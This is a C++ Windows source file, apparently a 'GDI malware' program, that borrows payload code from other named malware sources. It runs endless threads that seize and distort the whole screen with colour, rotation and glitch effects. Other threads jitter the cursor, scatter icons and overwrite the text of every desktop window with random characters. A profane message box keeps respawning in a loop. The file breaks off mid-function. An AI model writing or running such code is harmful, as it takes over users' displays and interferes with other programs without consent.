﻿#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include"resource.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
VOID WINAPI MG(HWND hwnd) {
    HWND window = hwnd;
    RECT windowRect;
    GetWindowRect(window, &windowRect);
    int w = windowRect.right - windowRect.left, h = windowRect.bottom - windowRect.top;
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = windowRect.right - windowRect.left;
    bmi.bmiHeader.biHeight = windowRect.bottom - windowRect.top;
    PRGBQUAD prgbScreen;
    HDC hdc = GetDC(window);
    HDC hcdc = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hcdc, hBitmap);
    for (;;) {
        HDC hdc = GetDC(window);    HWND window = hwnd;
        for (int x = 0; x < bmi.bmiHeader.biWidth; x++) {
            for (int y = 0; y < bmi.bmiHeader.biHeight; y++) {
                prgbScreen[x + bmi.bmiHeader.biWidth * y].rgb = x ^ y;
            }
        }
        BitBlt(hdc, 0, 0, bmi.bmiHeader.biWidth, bmi.bmiHeader.biHeight, hcdc, 0, 0, SRCINVERT);
        Sleep(100);
    }
}
HWND hwnd;
DWORD WINAPI MG2(LPVOID lpParam) {
    HWND window = hwnd;
    RECT windowRect;
    GetWindowRect(window, &windowRect);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = windowRect.right - windowRect.left;
    bmi.bmiHeader.biHeight = windowRect.bottom - windowRect.top;
    PRGBQUAD prgbScreen;
    for (;;) {
        HDC hdc = GetDC(window);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        if (hcdc == NULL || hdc == NULL) { ReleaseDC(0, hdc); continue; }
        SelectObject(hcdc, hBitmap);
        Sleep(1000);
        for (;;) {
            hdc = GetDC(window);
            for (int x = 0; x < bmi.bmiHeader.biWidth; x++) {
                for (int y = 0; y < bmi.bmiHeader.biHeight; y++) {
                    prgbScreen[x + bmi.bmiHeader.biWidth * y].rgb = RndRGB;
                }
            }
            SetBkMode(hcdc, 0);
            HFONT hFont; SelectObject(hcdc, hFont = CreateFontA(200, 30, 0, FW_THIN, 0, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "114514"));
            TextOutA(hcdc, 0, 0, "No N17Pro3426", 13);
            BitBlt(hdc, 0, 0, bmi.bmiHeader.biWidth, bmi.bmiHeader.biHeight, hcdc, 0, 0, SRCCOPY);
            Sleep(1000);
            ReleaseDC(0, hcdc);
            DeleteObject(hFont);
        }
    }
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    HWND msgboxHWND;
    if (nCode == HCBT_ACTIVATE)
    {
        msgboxHWND = (HWND)wParam;
        Sleep(100);
        HANDLE mbm = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MG, msgboxHWND, 0, NULL);
        return 0;
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}
HANDLE th;
LRESULT CALLBACK msgBoxHook2(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE)
    {
        hwnd = (HWND)wParam;
        th = CreateThread(NULL, 0, MG2, NULL, 0, NULL);
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)GetRandomChar(30), SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}
DWORD WINAPI Window1(LPVOID lpParam) {
    while (1 == 1)
    {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
        Sleep(100);
    }
}
DWORD WINAPI Window2(LPVOID lpParam) {
    while (true) {
        HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook2, 0, GetCurrentThreadId());
        MessageBoxA(NULL, "No N17Pro3426", "Fuck skidder!!", MB_ICONERROR | MB_ABORTRETRYIGNORE);
        if (hook != NULL) { UnhookWindowsHookEx(hook); }
        TerminateThread(th, 0);
        CloseHandle(th);
        Sleep(100);
    }
    return 0;
}
DWORD WINAPI Cursor1(LPVOID lpParam) {
    POINT p;
    for (;;) {
        GetCursorPos(&p);
        int x = rand() % 3 - 1, y = rand() % 3 - 1;
        p.x += x; p.y += y;
        SetCursorPos(p.x, p.y);
        DrawIcon(GetDC(0), p.x, p.y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
        Sleep(100);
    }
}
DWORD WINAPI Shader1_Gray(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    PRGBQUAD prgbScreen;
    for (;;) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        if (hcdc == 0) { ReleaseDC(0, hdc); continue; }//I have no idea :(
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (;;) {
            hdc = GetDC(0);
            BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    int rgb = (prgbScreen[x + w * y].r + prgbScreen[x + w * y].g + prgbScreen[x + w * y].b) / 3;
                    prgbScreen[x + w * y].rgb = RGB(rgb, rgb, rgb);
                }
            }
            BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdc); DeleteDC(hdc);
            Sleep(100);
        }
    }
}
DWORD WINAPI Shader2_Wrinkle(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    int screenWidth = GetSystemMetrics(0);
    int screenHigh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = screenHigh;
    for (;;) {
        hdcScreen = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdcScreen);
        if (hdcMem == 0) { ReleaseDC(0, hdcScreen); continue; }
        HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hdcMem, hbmTemp);
        for (;;) {
            hdcScreen = GetDC(0);
            BitBlt(hdcMem, 0, 0, screenWidth, screenHigh, hdcScreen, 0, 0, SRCCOPY);
            for (int i = 0; i < screenWidth * screenHigh; i++) {
                rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
            }
            BitBlt(hdcScreen, 0, 0, screenWidth, screenHigh, hdcMem, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
            Sleep(100);
        }
    }
}
DWORD WINAPI Shader3_a_GrayBlock(LPVOID lpParam) {//from Platinum/payload.h
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 };
    int size = 450, xxx = 0, rop = NULL;
    HDC hdc, hcdc;
    HBITMAP hBitmap;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        hdc = GetDC(0); hcdc = CreateCompatibleDC(hdc);
        if (hcdc == 0) { ReleaseDC(0, hdc); continue; }
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = (i * i * 2) % w, y = (i & i * 2) ^ w;
            rgbScreen[i].rgb ^= (x * y) | (i + w + h) * i;
        }
        rop = SRCCOPY; int luckynum = rand() % 5;
        if (luckynum == 2) { rop = SRCAND; }
        else if (luckynum == 4) { rop = SRCPAINT; }
        BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, rop);
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCAND);
        }
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCPAINT);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
        Sleep(100); xxx++;
    }
}
DWORD WINAPI Shader3_b_Rainble(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    for (;;) {
        hdc = GetDC(0); HDC hdcCopy = CreateCompatibleDC(hdc);
        if (hdcCopy == 0) { ReleaseDC(0, hdc); continue; }
        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);
        INT i = 0;
        for (;;) {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    int index = y * w + x;
                    int fx = (int)((i ^ 4) + (i * 4) * pow(x * y, (1.0 / 3.0)));
                    hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc); DeleteDC(hdc);
            Sleep(100);
        }
    }
}
DWORD WINAPI Payload1_a_Rotate(LPVOID lpParam) {//from Neoarsphenamine\payload.h
    HDC hdc, hdcMem;
    HBITMAP bm;
    while (1) {
        hdc = GetDC(0);
        hdcMem = CreateCompatibleDC(hdc);
        if (hdcMem == NULL) { ReleaseDC(0, hdc); continue; }
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        int inc3 = rand() % 700;
        int v = rand() % 2;
        if (v == 1) inc3 = -700;
        inc3++;
        pt[0].x = rect.left - inc3;
        pt[0].y = rect.top + inc3;
        pt[1].x = rect.right - inc3;
        pt[1].y = rect.top - inc3;
        pt[2].x = rect.left + inc3;
        pt[2].y = rect.bottom - inc3;
        PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
        Sleep(100);
    }
}
DWORD WINAPI Payload1_b_DrawCat(LPVOID lpParam) {//from Alkyl octanitrogen.cpp
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int xf = 0;
    int yf = 0;
    int signX = 15;
    int signY = 5;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int radius = 100.0f;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    while (1) {
        HDC hdc = GetDC(0);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 4), centerY = origY - (h / 4);
        x = (sin(angle) * radius) + centerX, y = (cos(angle) * radius) + centerY;
        for (INT i = 64; i > 8; i -= 8) {
            DrawIconEx(hdc, (50 + x - i + xf) - 128, (50 + y - i + yf) - 128, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)), 128, 128, 0, NULL, DI_NORMAL);
        }
        angle = fmod(angle + PI / radius, PI * radius);
        if (yf == 0) {
            signY = 5;
        }
        if (xf == 0) {
            signX = 15;
        }
        if (yf >= GetSystemMetrics(1)) {
            signY -= 5;
        }
        if (xf >= GetSystemMetrics(0)) {
            signX -= 15;
        }
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}
DWORD WINAPI Shader4_Wall(LPVOID lpParam) {//from APM 08279+5255.cpp
    HDC hdcScreen = GetDC(0);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    for (;;) {
        hdcScreen = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdcScreen);
        if (hdcMem == NULL) { ReleaseDC(0, hdcScreen); continue; }
        HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hdcMem, hbmTemp);
        for (;;) {
            hdcScreen = GetDC(0);
            BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
            for (INT i = 0; i < w * h; i++) {
                INT x = i % w, y = i / w;
                rgbScreen[i].r = x ^ y;
                rgbScreen[i].rgb += 225;
            }
            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
            Sleep(100);
        }
    }
}
DWORD WINAPI Shader5_Rainble2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    PRGBQUAD prgbScreen;
    HDC hdc = GetDC(0);
    for (;;) {
        hdc = GetDC(0); HDC hcdc = CreateCompatibleDC(hdc);
        if (hcdc == NULL) { ReleaseDC(NULL, hdc); continue; }
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (;;) {
            hdc = GetDC(0);
            BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    prgbScreen[x + w * y].rgb += Hue(239);
                }
            }
            BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdc); DeleteDC(hdc);
            Sleep(100);
        }
    }
}
DWORD WINAPI Shader6_Gourd(LPVOID lpParam) {//fram skidder MazeIcon skid malware
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    for (;;) {
        hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
        if (hdcCopy == NULL) { ReleaseDC(NULL, hdc); continue; }
        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);
        INT i = 0;
        while (true) {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            RGBQUAD rgbquadCopy;
            for (int x = 0; x < w; x++) {
                for (int y = 0; y < h; y++) {
                    int index = y * w + x;
                    double fractalX = (2.5f / w);
                    double fractalY = (1.90f / h);
                    double cx = x * fractalX - 2.f;
                    double cy = y * fractalY - 0.95f;
                    double zx = 0;
                    double zy = 0;
                    int fx = 0;
                    while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                        double fczx = zx * zx - zy * zy + cx;
                        double fczy = 3 * zx * zy + cy;
                        zx = fczx;
                        zy = fczy;
                        fx++;
                        rgbquadCopy = rgbquad[index];
                        hslcolor = Colors::rgb2hsl(rgbquadCopy);
                        hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                        hslcolor.s = 0.5f;
                        hslcolor.l = 0.3f;
                        rgbquad[index] = Colors::hsl2rgb(hslcolor);
                    }
                }
            }
            i++;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
            ReleaseDC(NULL, hdc); DeleteDC(hdc);
            Sleep(100);
        }
    }
}
DWORD WINAPI Payload2_a_ScreenErrorAndColourful(LPVOID lpParam) {
    HDC hdc, hcdc; HBITMAP bmi;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        hdc = GetDC(NULL); hcdc = CreateCompatibleDC(hdc);
        if (hcdc == NULL) { ReleaseDC(0, hdc); continue; }
        bmi = CreateCompatibleBitmap(hdc, w, h);
        HBITMAP bmiOld = (HBITMAP)SelectObject(hcdc, bmi);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int x = (rand() % 20) - 10;
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        HBRUSH hBrush; HBITMAP BrushOld = (HBITMAP)SelectObject(hdc, hBrush = CreateSolidBrush(RndRGB));
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        Sleep(100);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
        SelectObject(hdc, BrushOld);
        DeleteObject(hBrush);
        SelectObject(hcdc, bmiOld);
        DeleteObject(bmi);
        DeleteDC(hcdc);
        ReleaseDC(NULL, hdc);
        Sleep(100);
    }
}
DWORD WINAPI Payload2_b_DrawIcon(LPVOID lpParam) {
    LPCWSTR icons[] = { IDI_ERROR,IDI_APPLICATION,IDI_WARNING,IDI_INFORMATION,IDI_QUESTION,IDI_WINLOGO };
    LPCWSTR curs[] = { IDC_HELP,IDC_NO,IDC_SIZE,IDC_CROSS,IDC_ARROW,IDC_WAIT,IDC_HAND,IDC_PERSON };
    while (1 == 1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        DrawIcon(GetDC(0), rand() % w, rand() % h, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1)));
        DrawIconEx(GetDC(0), rand() % w, rand() % h, LoadIcon(0, icons[rand() % 6]), 100, 100, 0, NULL, DI_NORMAL);
        DrawIconEx(GetDC(0), rand() % w, rand() % h, LoadCursor(0, curs[rand() % 8]), 100, 100, 0, NULL, DI_NORMAL);
        Sleep(100);
    }
}
DWORD WINAPI Shader7_Wall2(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    HDC hdc, hcdc;
    for (int i = 0;; i++) {
        hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc); HBITMAP hBitmap;
        if (hcdc == 0) { ReleaseDC(NULL, hdc); continue; }
        RGBQUAD* pBits = NULL;
        hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        hdc = GetDC(NULL);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
        for (int y = 0; y < h; ++y) {
            for (int x = 0; x < w; ++x) {
                int index = x ^ y * w;
                BYTE originalRed = pBits[index].rgbRed;
                BYTE originalGreen = pBits[index].rgbGreen;
                BYTE originalBlue = pBits[index].rgbBlue;
                BYTE fractalRed = (x ^ y) + i * 1;
                BYTE fractalGreen = (x ^ y) * i * 0;
                BYTE fractalBlue = (x ^ y) | i * 2;
                pBits[index].rgbRed = static_cast<BYTE>(1 * originalRed + 0.5 * fractalRed);
                pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalGreen);
                pBits[index].rgbBlue = static_cast<BYTE>(2 * originalBlue + fractalBlue);
                pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.5);
                pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.5));
                pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.5);
                pBits[index].rgbRed = static_cast<BYTE>(0.5 * fractalBlue + 0.5 * fractalGreen);
                pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalRed + 0.5 * fractalBlue);
                pBits[index].rgbBlue = static_cast<BYTE>(0.5 * fractalGreen + 0.5 * fractalRed);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        ReleaseDC(NULL, hdc);
        Sleep(100);
    }
}
DWORD WINAPI Payload3_Big(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        POINT p[3];
        int rrr;
        p[0].x = -(rrr = rand() % 100); p[0].y = -rrr;
        p[1].x = w + (rrr = rand() % 100); p[1].y = -rrr;
        p[2].x = -(rrr = rand() % 100); p[2].y = h + rrr;
        PlgBlt(GetDC(0), p, GetDC(0), 0, 0, w, h, NULL, 0, 0);
        Sleep(100);
    }
}
DWORD WINAPI Payload4_a_CircleZ(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        const int size = 5600;
        int x = w / 2, y = h / 2;
        for (int i = 0; i < size; i += 100) {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
}
DWORD WINAPI Payload4_b_Blur(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        if (hcdc == NULL) { ReleaseDC(NULL, hdc); continue; }
        HBITMAP bm = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, bm);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        int x = rand() % 10 - 5, y = rand() % 10 - 5;
